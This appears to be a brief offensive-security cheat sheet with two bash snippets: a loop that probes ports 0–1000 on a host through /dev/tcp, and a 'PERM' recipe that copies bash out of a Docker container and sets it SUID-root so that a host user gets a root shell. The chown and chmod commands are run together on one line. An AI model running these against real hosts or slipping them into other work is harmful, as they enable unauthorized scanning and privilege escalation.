
```bash
#!/bin/bash

for PORT in {0..1000};

do timeout 1 bash -c "</dev/tcp/$IP/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open";

done
```


# PERM

```bash
# As user on host machine 
cp /bin/bash . 
# As root in the docker container 
chown root:root bash chmod 4755 bash
```